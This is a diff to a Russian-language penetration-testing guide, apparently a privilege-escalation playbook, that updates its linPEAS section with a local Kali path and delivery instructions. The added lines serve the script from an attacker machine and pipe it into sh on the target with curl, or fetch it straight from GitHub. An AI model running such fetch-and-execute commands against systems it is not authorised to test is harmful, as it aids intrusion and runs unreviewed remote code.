@@ -23,11 +23,15 @@ history; ls -la ~ /tmp /var/tmp /dev/shm
 
 ## 2. linPEAS — сканер
 
-Не вендорится в пакет (лицензия проекта). Доставка на цель:
+Локальная копия (Kali): `/usr/share/peass/linpeas/linpeas.sh` (обновление: свежий `linpeas.sh` с GitHub-releases PEASS-ng; Windows-staging: `<каталог инструментов>\tools\linpeas.sh`). Вендорить скрипт в публичный пакет не нужно (лицензия PEASS — некоммерческая, локальное использование — ок). Доставка на цель:
 
 ```sh
-# с Kali: apt install peass; файл linpeas.sh из пакета, передать на цель (python3 -m http.server)
-# или напрямую: curl -fsSL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+# с атакующей машины:
+python3 -m http.server 8000        # в каталоге с linpeas.sh
+# на цели:
+curl http://IP:8000/linpeas.sh | sh
+# или напрямую (если у цели есть свой исходящий доступ):
+curl -fsSL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
 ```
 
 Читай только красное/жёлтое; зелёное — шум. linPEAS не заменяет §1 — он его расширяет.
